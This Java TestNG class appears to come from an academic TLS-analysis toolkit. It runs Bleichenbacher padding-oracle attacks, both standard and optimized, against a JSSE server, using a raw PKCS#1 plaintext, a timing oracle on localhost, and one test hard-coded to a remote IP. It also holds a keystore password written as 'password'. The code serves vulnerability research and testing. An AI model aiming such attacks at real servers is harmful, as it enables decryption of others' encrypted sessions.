package de.rub.nds.ssl.analyzer.attacks;

import de.rub.nds.ssl.analyzer.attacker.Bleichenbacher;
import de.rub.nds.ssl.analyzer.attacker.BleichenbacherCrypto12;
import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.AOracle;
import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.JSSE16Oracle;
import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.StdPlainOracle;
import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles.TimingOracle;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.SocketException;
import java.security.GeneralSecurityException;
import java.security.InvalidKeyException;
import java.security.KeyStore;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.Security;
import java.security.UnrecoverableKeyException;
import java.security.cert.CertificateException;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import org.apache.log4j.Logger;
import org.apache.log4j.PropertyConfigurator;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
import org.testng.annotations.AfterMethod;
import org.testng.annotations.BeforeClass;
import org.testng.annotations.BeforeMethod;
import org.testng.annotations.Test;

/**
 * Performs the Bleichenbacher Tests (original/optimized) against a vulnerable
 * server.
 *
 * @author Sebastian Schinzel - schinzel@fh-muenster.de
 * @version 0.1
 *
 * Apr 2, 2013
 */
public class BleichenbacherJSSETest1024 {

    /**
     * Plain PKCS message
     */
    byte[] plainPKCS = new byte[]{
        (byte) 0,
        (byte) 2, (byte) 49, (byte) -97, (byte) 123, (byte) 127, (byte) 103,
        (byte) -83, (byte) 103, (byte) 9, (byte) 25, (byte) -17, (byte) -17,
        (byte) -21, (byte) 117, (byte) -69, (byte) 15, (byte) -43, (byte) 43,
        (byte) -19, (byte) -111, (byte) 35, (byte) 127, (byte) 73, (byte) -3,
        (byte) -45, (byte) 3, (byte) 15, (byte) -87, (byte) 93, (byte) -107,
        (byte) 115, (byte) 53, (byte) -5, (byte) -43, (byte) -45, (byte) 87,
        (byte) 43, (byte) -65, (byte) 87, (byte) 109, (byte) -95, (byte) -123,
        (byte) 71, (byte) -63, (byte) 11, (byte) -59, (byte) 101, (byte) -7,
        (byte) -109, (byte) -117, (byte) 33, (byte) 85, (byte) 49, (byte) 33,
        (byte) -91, (byte) -69, (byte) 97, (byte) 15, (byte) -83, (byte) -105,
        (byte) 21, (byte) -65, (byte) 45, (byte) 43, (byte) 127, (byte) 5,
        (byte) -37, (byte) -23, (byte) 15, (byte) 105, (byte) -117, (byte) 41,
        (byte) 65, (byte) -5, (byte) 7, (byte) 87, (byte) -103, (byte) 13,
        (byte) 0, (byte) -127, (byte) -31, (byte) 59, (byte) -123, (byte) -29,
        (byte) 49, (byte) 7, (byte) 25, (byte) 5, (byte) -35, (byte) 75,
        (byte) -71, (byte) -17, (byte) -69, (byte) -67, (byte) 123, (byte) -33,
        (byte) -67, (byte) -31, (byte) -27, (byte) -69, (byte) 125, (byte) -13,
        (byte) -111, (byte) 119, (byte) -85, (byte) 73, (byte) 47, (byte) -101,
        (byte) 125, (byte) -37, (byte) -53, (byte) -95, (byte) -27, (byte) -79,
        (byte) 115, (byte) -39, (byte) -105, (byte) 35, (byte) 15, (byte) -21,
        (byte) 31, (byte) -51, (byte) -113, (byte) 21, (byte) 91, (byte) 125,
        (byte) -11
    /*
     * VALID PKCS with valid PMS 1024bit
     */
//        (byte) 0x00, (byte) 0x02,
//        (byte) 0x01, (byte) 0x01, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe, (byte) 0xc0, (byte) 0xff, (byte) 0xee,
//        (byte) 0xba, (byte) 0xbe,
//        (byte) 0x00,
//        (byte) 0x03, (byte) 0x01,
//        (byte) 0x01, (byte) 0x02, (byte) 0x03, (byte) 0x04, (byte) 0x05,
//        (byte) 0x06, (byte) 0x07, (byte) 0x08, (byte) 0x09, (byte) 0x0a,
//        (byte) 0x0b, (byte) 0x0c, (byte) 0x0d, (byte) 0x0e, (byte) 0x0f,
//        (byte) 0x10, (byte) 0x11, (byte) 0x12, (byte) 0x13, (byte) 0x14,
//        (byte) 0x15, (byte) 0x16, (byte) 0x17, (byte) 0x18, (byte) 0x19,
//        (byte) 0x1a, (byte) 0x1b, (byte) 0x1c, (byte) 0x1d, (byte) 0x1e,
//        (byte) 0x1f, (byte) 0x20, (byte) 0x21, (byte) 0x22, (byte) 0x23,
//        (byte) 0x24, (byte) 0x25, (byte) 0x26, (byte) 0x27, (byte) 0x28,
//        (byte) 0x29, (byte) 0x2a, (byte) 0x2b, (byte) 0x2c, (byte) 0x2d,
//        (byte) 0x2e
    };
    private PrivateKey privateKey;
    private PublicKey publicKey;
    /**
     * Log4j logger initialization.
     */
    private static Logger logger = Logger.getRootLogger();

    private static KeyStore loadKeyStore(final String keyStorePath,
            final String keyStorePassword) throws KeyStoreException, IOException,
            NoSuchAlgorithmException, CertificateException {
        KeyStore ks = KeyStore.getInstance("JKS");
        ks.load(new FileInputStream(keyStorePath), keyStorePassword.
                toCharArray());

        return ks;
    }

    private static byte[] encryptHelper(final byte[] msg,
            final PublicKey publicKey) {
        byte[] result = null;
        try {
            System.out.println("Got msg with length " + msg.length);
            Cipher cipher = Cipher.getInstance("RSA/None/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, publicKey);
            result = cipher.doFinal(msg);
        } catch (NoSuchAlgorithmException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (IllegalBlockSizeException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (BadPaddingException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (InvalidKeyException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (NoSuchPaddingException ex) {
            logger.error(ex.getMessage(), ex);
        }

        return result;
    }

    @Test(enabled = false, priority = 1)
    public void standardBleichenbacher() throws SocketException,
            OracleException {
        JSSE16Oracle jsseOracle = new JSSE16Oracle("134.147.198.93", 51635);

        byte[] encPMS = encryptHelper(plainPKCS, publicKey);
        Bleichenbacher attacker = new Bleichenbacher(encPMS,
                jsseOracle, true);
        attacker.attack();
    }

    @Test(enabled = false, priority = 2)
    public void optimizedBleichenbacher() throws SocketException,
            OracleException {
        JSSE16Oracle jsseOracle = new JSSE16Oracle("134.147.198.93", 51635);

        byte[] encPMS = encryptHelper(plainPKCS, publicKey);
        BleichenbacherCrypto12 attacker = new BleichenbacherCrypto12(encPMS,
                jsseOracle, true);
        attacker.attack();
    }

    @Test(enabled = false, priority = 2)
    public void sslTriggerPlaintextTest() throws SocketException,
            OracleException, InterruptedException, IOException,
            GeneralSecurityException {
        byte[] plainPKCScopy = new byte[plainPKCS.length];
        System.arraycopy(plainPKCS, 0, plainPKCScopy, 0, plainPKCScopy.length);
        StdPlainOracle plainOracle = new StdPlainOracle(publicKey,
                AOracle.OracleType.FFT, 128);
        BleichenbacherCrypto12 bleichenbacher = new BleichenbacherCrypto12(
                plainPKCScopy, plainOracle, true);
        bleichenbacher.attack();
    }

    @Test(enabled = true, priority = 2)
    public void sslTriggerOracleTest() throws SocketException,
            OracleException,
            InterruptedException,
            NoSuchAlgorithmException,
            InvalidKeyException,
            NoSuchPaddingException,
            IOException,
            GeneralSecurityException {
        byte[] valid;
        byte[] plainValidPKCSCopy = new byte[plainPKCS.length];
        byte[] plainInvalidPKCSCopy = new byte[plainPKCS.length];

        // get fresh valid pkcsPKCS copy
        System.arraycopy(plainPKCS, 0, plainValidPKCSCopy, 0,
                plainValidPKCSCopy.length);
        // get fresh invalid pkcsPKCS copy
        System.arraycopy(plainPKCS, 0, plainInvalidPKCSCopy, 0,
                plainInvalidPKCSCopy.length);
        plainInvalidPKCSCopy[0] = (byte) 23;

        // get valid encrypted PKCS structure
        valid = encryptHelper(plainValidPKCSCopy, publicKey);

        boolean pmsContainedInPKCSIsValid = false;
        TimingOracle timingOracle = new TimingOracle("127.0.0.1", 10443,
                privateKey, AOracle.OracleType.FFT, plainValidPKCSCopy,
                plainInvalidPKCSCopy, pmsContainedInPKCSIsValid);
        timingOracle.warmUp();

        try {
            new File("test.csv").delete();
            new File("invalid.csv").delete();
        } catch (Exception e) {
            e.printStackTrace();
        }

        BleichenbacherCrypto12 attacker = new BleichenbacherCrypto12(valid,
                timingOracle, true);
        attacker.attack();

//        //test invalid PKCS1 messages
//        test = getInvalidPKCS1messages();
//        for (int i = 0; i < test.length; i++) {
//            enc = encryptHelper(test[i], publicKey);
//            jsseOracle.checkPKCSConformity(enc);
//            counter++;
//        }
//
//        test = getInvalidPMSlength();
//        for (int i = 0; i < test.length; i++) {
//            enc = encryptHelper(test[i], publicKey);
//            jsseOracle.checkPKCSConformity(enc);
//            counter++;
//        }
//
//        test = getInvalidPMSlength2();
//        for (int i = 0; i < test.length; i++) {
//            enc = encryptHelper(test[i], publicKey);
//            jsseOracle.checkPKCSConformity(enc);
//            counter++;
//        }

        // invalid ssl version number (explicitly taken 128, 129 and 255 to 
        // produce a "byte converstion overflow")
        /*System.arraycopy(plainPKCS, 0, plainPKCSCopy, 0, plainPKCSCopy.length);
         int[] x = {0, 1, 2, 3, 4, 128, 129, 255};
         for (int i = 0; i < x.length; i++) {
         plainPKCSCopy[plainPKCSCopy.length - 48] = (byte) x[i];
         enc = encryptHelper(plainPKCSCopy, publicKey);
         jsseOracle.checkPKCSConformity(enc);
         counter++;
         }

         Thread.sleep(5000);

         // valid
         System.arraycopy(plainPKCS, 0, plainPKCSCopy, 0, plainPKCSCopy.length);
         enc = encryptHelper(plainPKCSCopy, publicKey);

         jsseOracle.checkPKCSConformity(enc);
         counter++;

         System.out.println("counter: " + counter);
         * */
    }

//    /**
//     *
//     * @return invalid PKCS1 messages
//     */
//    private byte[][] getInvalidPKCS1messages() {
//        byte[][] invalidPKCS1messages = new byte[10][plainPKCS.length];
//        for (int i = 0; i < 9; i++) {
//            invalidPKCS1messages[i] = Arrays.copyOf(plainPKCS, plainPKCS.length);
//        }
//        // set the second byte to 0x01 (should be 0x02)
//        invalidPKCS1messages[0][1] = 0x01;
//        // set the second byte to 0x00 (should be 0x02)
//        invalidPKCS1messages[1][1] = 0x00;
//
//        for (int i = 2; i < 10; i++) {
//            invalidPKCS1messages[i][i] = 0x00;
//        }
//        return invalidPKCS1messages;
//    }
//
//    /**
//     *
//     * @return invalid pms length messages (0x00 at a wrong position)
//     */
//    private byte[][] getInvalidPMSlength() {
//        // invalid 0x00 positions computed as:
//        //   pkcs - 10 (10 leading bytes) - 49 (48-byte PMS + 0x0 byte)
//        int x = plainPKCS.length - 59;
//        byte[][] invalidPMSlengthMessages = new byte[x][plainPKCS.length];
//        for (int i = 0; i < x; i++) {
//            invalidPMSlengthMessages[i] =
//                    Arrays.copyOf(plainPKCS, plainPKCS.length);
//            invalidPMSlengthMessages[i][10 + i] = 0x00;
//        }
//        return invalidPMSlengthMessages;
//    }
//
//    /**
//     *
//     * @return invalid pms length messages (0x00 at a wrong position in the pms
//     * area)
//     */
//    private byte[][] getInvalidPMSlength2() {
//        // 49 invalid messages
//        byte[] current = Arrays.copyOf(plainPKCS, plainPKCS.length);
//        for (int i = 0; i < 49; i++) {
//            current[plainPKCS.length - i - 1] = 0x01;
//        }
//        byte[][] invalidPMSlengthMessages = new byte[49][plainPKCS.length];
//        invalidPMSlengthMessages[0] = current.clone();
//        for (int i = 1; i < 49; i++) {
//            invalidPMSlengthMessages[i] =
//                    Arrays.copyOf(current, plainPKCS.length);
//            invalidPMSlengthMessages[i][plainPKCS.length - i] = 0x00;
//        }
//        return invalidPMSlengthMessages;
//    }
    @BeforeMethod
    protected void printMethodBanner(Method method) throws Exception {
        String testName = method.getName();
        logger.info("++++Start Test (" + testName + ")++++");
    }

    @AfterMethod
    protected void printEndOfMethodBanner(Method method) throws Exception {
        String testName = method.getName();
        logger.info("++++End of Test (" + testName + ")++++");
        logger.info("------------------------------");
    }

    /**
     * Initialize logging properties and the 1024 bit long key
     */
    @BeforeClass
    public void setUpClass() {
        PropertyConfigurator.configure("logging.properties");
        logger.info("##################################");
        logger.info(this.getClass().getSimpleName());
        logger.info("##################################");
        Security.addProvider(new BouncyCastleProvider());

        try {
            String keyName = "1024_rsa";
            String keyPassword = "password";
            KeyStore ks = loadKeyStore("1024.jks", "password");
            publicKey = ks.getCertificate(keyName).getPublicKey();
            privateKey = (PrivateKey) ks.getKey(keyName, keyPassword.
                    toCharArray());
        } catch (UnrecoverableKeyException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (KeyStoreException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (IOException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (CertificateException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (NoSuchAlgorithmException ex) {
            logger.error(ex.getMessage(), ex);
        }
    }
}
